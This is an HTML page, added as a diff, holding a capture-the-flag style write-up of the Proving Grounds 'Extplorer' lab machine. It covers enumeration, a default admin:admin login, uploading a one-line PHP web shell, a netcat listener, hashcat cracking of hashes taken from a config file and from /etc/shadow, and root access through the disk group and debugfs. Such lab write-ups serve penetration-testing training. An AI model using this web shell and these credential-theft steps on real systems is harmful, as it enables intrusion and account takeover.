@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds Extplorer Writeup - Rachel Murphy" />
+  <title>PG: Extplorer | Rachel Murphy</title>
+
+  <!-- Base site styling -->
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    .code-block { margin: 1rem 0; }
+    pre { background: rgba(15,23,36,0.9); padding: 1rem; border-radius: 6px; overflow-x: auto; }
+    .meta { color: #cbd5e1; font-size: 0.95rem; margin-bottom: .5rem; }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="wrap">
+      <h1>Extplorer — Writeup</h1>
+      <p class="meta">Proving Grounds — Linux / Web Application Exploitation</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+    <!-- Machine summary / description -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Intermediate</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds</p>
+      <p><strong>Description:</strong> The Extplorer virtual machine (VM) is a retired Linux box designed to teach web application penetration testing and privilege escalation skills. The box features a WordPress installation alongside the eXtplorer file manager, which provides opportunities for credential exploitation, file upload vulnerabilities, and local privilege escalation.</p>
+
+      <h3>Key Learning Objectives</h3>
+      <ul>
+        <li>Web server enumeration and directory discovery</li>
+        <li>Credential harvesting and cracking</li>
+        <li>File upload exploitation and reverse shell creation</li>
+        <li>Privilege escalation through group permissions and debugfs</li>
+      </ul>
+    </section>
+
+    <!-- Enumeration -->
+    <section class="enumeration">
+      <h2>Enumeration</h2>
+      <h3>Nmap Scan</h3>
+      <p>Initial scan:</p>
+      <pre><code>sudo nmap -sC -sV 192.168.236.16 -oN nmap-extplorer</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711003227.png" alt="Nmap scan screenshot">
+      <p>All ports scan:</p>
+      <pre><code>sudo nmap -p- -sC -sV 192.168.236.16 -oN nmap-extplorer-all-ports</code></pre>
+      <p>WordPress detected on port 80.</p>
+    </section>
+
+    <!-- Web -->
+    <section class="web">
+      <h2>Web Enumeration</h2>
+      <p>Homepage revealed:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711003419.png" alt="WordPress homepage">
+
+      <h3>Feroxbuster</h3>
+      <pre><code>feroxbuster -u "http://192.168.236.16" -w /usr/share/seclists/Discovery/Web-Content/common.txt --depth 2 --filter-status 404</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711100612.png" alt="Feroxbuster output">
+      <p>/filemanager directory discovered, leads to login page.</p>
+      <img class="screenshot" src="../images/Pasted image 20250711100637.png" alt="Filemanager login">
+
+      <h3>Login & User Discovery</h3>
+      <p>Logged in with <code>admin:admin</code>. User <strong>dora</strong> identified:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711100806.png" alt="Dora user found">
+    </section>
+
+    <!-- Reverse Shell -->
+    <section class="reverse-shell">
+      <h2>Reverse Shell</h2>
+      <p>Uploaded PHP webshell:</p>
+      <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711101817.png" alt="Upload PHP shell">
+
+      <p>Access via browser, then trigger reverse shell:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711101954.png" alt="Accessing shell">
+      <p>Netcat listener:</p>
+      <pre><code>nc -lvnp 9001</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711102245.png" alt="Listener running">
+    </section>
+
+    <!-- User Dora -->
+    <section class="user-dora">
+      <h2>Credentials & User Dora</h2>
+      <p>Dora’s password hash found in configuration file:</p>
+      <pre><code>cat /var/www/html/filemanager/config/.htusers.php</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711110106.png" alt="Dora hash">
+
+      <p>Cracked hash with hashcat:</p>
+      <pre><code>hashcat -m 3200 dora.hash /usr/share/wordlists/rockyou.txt</code></pre>
+      <p>Password found: <strong>doraemon</strong></p>
+      <img class="screenshot" src="../images/Pasted image 20250711114306.png" alt="Switching to Dora user">
+    </section>
+
+    <!-- Privilege Escalation -->
+    <section class="privilege-escalation">
+      <h2>Privilege Escalation</h2>
+      <p>Dora belongs to <code>disk</code> group, which allows root-level access through debugfs:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711120933.png" alt="Dora group membership">
+
+      <pre><code>debugfs /dev/mapper/ubuntu--vg-ubuntu--lv</code></pre>
+      <p>Read /etc/shadow and grab root hash:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711122141.png" alt="Read /etc/shadow">
+
+      <p>Crack root hash with hashcat:</p>
+      <pre><code>hashcat -m 1800 --user root.hash /usr/share/wordlists/rockyou.txt</code></pre>
+      <p>Root password: <strong>explorer</strong></p>
+      <img class="screenshot" src="../images/Pasted image 20250711122929.png" alt="Switch to root">
+      <p>Grab proof.txt:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711123026.png" alt="Proof file">
+    </section>
+
+    <!-- Box Summary -->
+    <section class="summary">
+      <h2>Box Summary</h2>
+      <p>The Extplorer VM teaches a complete workflow for web application exploitation and Linux privilege escalation. Learners practice enumeration, credential cracking, file upload exploits, and root escalation via misconfigured permissions.</p>
+      <ul>
+        <li><strong>Initial Access:</strong> Discover eXtplorer through web enumeration, login using credentials or default passwords.</li>
+        <li><strong>Web Exploitation:</strong> Upload PHP webshell to gain a reverse shell.</li>
+        <li><strong>User Privileges:</strong> Identify hashes for application users and crack them for access.</li>
+        <li><strong>Privilege Escalation:</strong> Exploit membership in disk group and debugfs to extract root hash, then crack to become root.</li>
+      </ul>
+    </section>
+  </main>
+</body>
+</html>
